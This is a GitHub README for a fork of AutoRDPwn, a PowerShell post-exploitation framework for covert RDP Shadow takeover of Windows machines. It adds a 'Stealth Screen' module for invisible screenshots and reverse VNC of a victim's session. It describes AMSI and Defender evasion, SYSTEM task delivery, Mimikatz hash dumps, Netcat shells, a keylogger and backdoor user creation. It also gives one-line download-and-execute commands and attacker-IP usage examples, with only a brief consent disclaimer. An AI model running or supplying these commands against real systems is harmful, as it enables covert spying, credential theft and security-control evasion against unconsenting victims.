<p align="center"><img width=450 alt="AutoRDPwn" src="https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Design/AutoRDPwn.png"></p>

**AutoRDPwn** is a post-exploitation framework created in Powershell, designed primarily to automate the **Shadow** attack on Microsoft Windows computers. This vulnerability (listed as a feature by Microsoft) allows a remote attacker to view his victim's desktop without his consent, and even control it on demand, using tools native to the operating system itself.

This is a fork of the original [AutoRDPwn](https://github.com/JoelGMSec/AutoRDPwn) by Joel Gámez Molina, extended with new post-exploitation modules such as the **Stealth Screen** engine (invisible screenshots and live reverse VNC of the remote console session).

Thanks to the additional modules, it is possible to obtain a remote shell through Netcat, dump system hashes with Mimikatz, load a remote keylogger and much more. All this, Through a completely intuitive menu in seven different languages.

Additionally, it is possible to use it in a reverse shell through a series of parameters that are described in the usage section.


# Requirements
Powershell 4.0 or higher


# Changes
## Version 5.2 (this fork)
• New module: **Stealth Screen** - captures an invisible screenshot or opens a live reverse VNC view of the remote console session, without the victim noticing

• Injection engine: acquires the interactive user token of console session 1 and spawns the payload on the target desktop with CreateProcessAsUserW, no window is ever shown on the victim

• Delivery through an ephemeral scheduled task running as SYSTEM, registered and unregistered automatically in every run

• The target side stages only temporary scripts under C:\Windows\Temp and removes them after execution; the VNC module is fetched over HTTP from the attacker and decoded in memory before it runs

• View mode uses an UltraVNC reverse connection: the target connects back to the attacker's listener, so no inbound firewall rule is needed on the victim

• Shot mode captures a full-resolution PNG of the target screen and pulls it back over the existing WinRM channel

• VNC module delivery is AMSI-evasive: the payload travels XOR-encrypted over HTTP and is patched at runtime before execution, with the AMSI patch built from char codes so no plaintext indicator is present

• Unified menu: attack vectors and all modules live in a single arrow-key TUI, there is no separate modules screen any more

• Defender exclusions and the SYSTEM task run before the payload lands, so the decode/execute step is not scanned

• Every attack in every menu now shows a short description of what it does and what it is for, in all seven languages

• Fixed Handle leaks and P/Invoke marshaling errors in the token engine (wtsapi32, kernel32 and advapi32 signatures)

• Elevation is now requested with a normal UAC prompt when not running as Administrator; -noadmin keeps the menu unelevated

## Version 5.1
• Many bugs fixed

• Aesthetic improvements and improved waiting times

• Proxy-Aware connection through system settings

• It is now possible to use the offline tool by downloading the .zip file

• Language auto-detection by pressing the enter key

• Invoke-DCOM has been replaced by SharpRDP

• PowerUp has been replaced by Invoke-PrivescCheck

• Creation of the automatic cleaning subroutine in the victim

• New module available: SMB Shell encrypted with AES

• New module available: Change user with RunAs

*The rest of the changes can be consulted in the CHANGELOG file


# Usage
This application can be used locally, remotely or to pivot between teams.

When used remotely in a reverse shell, it is necessary to use the following parameters:

| Parameter               | Description                                                                                    | 
| :---------------------- | :--------------------------------------------------------------------------------------------- | 
| **-noadmin**            | Keeps the menu in the current console, without requesting elevation                            |
| **-nogui**              | This will avoid loading the menu and some colors, guaranteed its functionality                 | 
| **-lang**               | We will choose our language (English, Spanish, French, German, Italian, Russian or Portuguese) |
| **-option**             | Action ID to run directly (1-8, 101-704); legacy aliases 11-17 are still accepted              |
| **-shadow**             | We will decide if we want to see or control the remote device                                  |
| **-createuser**         | This parameter is optional, the user AutoRDPwn:AutoRDPwn will be created on the victim machine |
| **-noclean**            | Skips target/user artifact cleanup; Defender exclusions are still restored                     |

### Running the menu
When the console is not running as Administrator, AutoRDPwn requests elevation with a normal UAC prompt. If the prompt is cancelled, it prints an error and exits.

• Run the terminal as **Administrator** - the menu starts directly

• Launch with **-noadmin** - keeps the menu in the current console, without elevation

**Saved targets:**
Press `P` to load a saved target profile and `S` to save the current target. Profiles keep the host, user, domain, attacker IP and mode, and are stored in `Resources\Tools\targets.json`; passwords and NTLM hashes are protected with Windows DPAPI and the file is ignored by git.

**Local execution on one line:**
```
powershell -ep bypass "cd $env:temp ; iwr https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/AutoRDPwn.ps1 -outfile AutoRDPwn.ps1 ; .\AutoRDPwn.ps1"
```

**Example of remote execution on a line:**
```
powershell -ep bypass "cd $env:temp ; iwr https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/AutoRDPwn.ps1 -outfile AutoRDPwn.ps1 ; .\AutoRDPwn.ps1 -nogui -lang English -option 4 -shadow control -createuser"
```


### The detailed guide of use can be found at the following link:

https://darkbyte.net/autordpwn-la-guia-definitiva


# Stealth Screen module
## Quick Screen (menu option 8)
The main menu includes a dedicated shortcut, so the whole flow is: target, user, password, your IP, and whether you want control or view only. The attacker IP defaults to the first non-loopback IPv4 detected on your machine, and the listener uses port 5500.

```
[8] - Quick Screen (Stealth VNC)
     Watch or control the target screen without the user noticing
```

```
powershell -ep bypass "cd $env:temp ; iwr https://raw.githubusercontent.com/jeko1107/AutoRDPwn/master/AutoRDPwn.ps1 -outfile AutoRDPwn.ps1 ; .\AutoRDPwn.ps1 -option 8"
```

## Direct usage
This module can also be used directly, outside the framework menu:

```powershell
Import-Module .\Resources\Scripts\Invoke-StealthScreen.ps1

# Capture a screenshot of the remote console session
Invoke-StealthScreen -Target 192.168.1.100 -User administrator -Pass Password123! -Mode shot

# Open a live reverse VNC view of the remote console session
Invoke-StealthScreen -Target 192.168.1.100 -User administrator -Pass Password123! -Mode view -AttackerIP 192.168.1.50 -Port 5500
```

| Parameter        | Description                                                                                       |
| :--------------- | :------------------------------------------------------------------------------------------------ |
| **-Target**      | IP or hostname of the victim machine, reachable over WinRM (port 5985)                            |
| **-User**        | Valid local administrator username on the target                                                  |
| **-Pass**        | Password of that user                                                                             |
| **-Mode**        | `shot` = single screenshot PNG saved to your temp folder, `view` = live reverse VNC session        |
| **-AttackerIP**  | Your IP address, used by the target to connect back the VNC channel (view mode only)              |
| **-Port**        | Port of the VNC listener, default 5500                                                            |
| **-Password**    | VNC password, maximum 8 characters, default AutoRDPw                                              |
| **-Path**        | Temporary path on the victim, default C:\Windows\Temp                                             |
| **-ViewOnly**    | Watch the screen without sending input, the listener runs with `/viewonly` (view mode only)      |

Requirements for the target: Windows with PowerShell 5.1 and WinRM enabled. The victim user sees nothing: the payload runs hidden in his own console session.


# Screenshots
![AutoRDPwn1_en](https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Screenshots/AutoRDPwn1_en.PNG)
![AutoRDPwn2_en](https://raw.githubusercontent.com/JoelGMSec/AutoRDPwn/master/Resources/Screenshots/AutoRDPwn2_en.PNG)


# License
This project is licensed under the GNU 3.0 license - see the LICENSE file for more details.


# Credits and Acknowledgments
This framework has been created and designed from scratch by Joel Gámez Molina // @JoelGMSec

Some modules use third-party code, scripts, and tools, particularly:

• **Chachi-Enumerator** by *Luis Vacas* --> https://github.com/Hackplayers/PsCabesha-tools

• **Invoke-Phant0m** by *Halil Dalabasmaz* --> https://github.com/hlldz/Invoke-Phant0m

• **Invoke-PowerShellTcp** by *Nikhil "SamratAshok" Mittal* --> https://github.com/samratashok/nishang

• **Invoke-TheHash** by *Kevin Robertson* --> https://github.com/Kevin-Robertson/Invoke-TheHash

• **Mimikatz** by *Benjamin Delpy* --> https://github.com/gentilkiwi/mimikatz

• **PsExec** by *Mark Russinovich* --> https://docs.microsoft.com/en-us/sysinternals/downloads/psexec

• **RDP Wrapper** by *Stas'M Corp.* --> https://github.com/stascorp/rdpwrap

• **SharpRDP** by *Steven F* --> https://github.com/0xthirteen/SharpRDP

And many more, that do not fit here.. Thanks to all of them and their excellent work.


# Contact
This software does not offer any kind of guarantee. Its use is exclusive for educational environments and / or security audits with the corresponding consent of the client. I am not responsible for its misuse or for any possible damage caused by it.

For more information, you can find me on Twitter as [@JoelGMSec](https://twitter.com/JoelGMSec) and on my blog [darkbyte.net](https://darkbyte.net).


# Support
You can support my work buying me a coffee:

[<img width=250 alt="buymeacoffe" src="https://cdn.buymeacoffee.com/buttons/v2/default-blue.png">](https://www.buymeacoffee.com/joelgmsec)
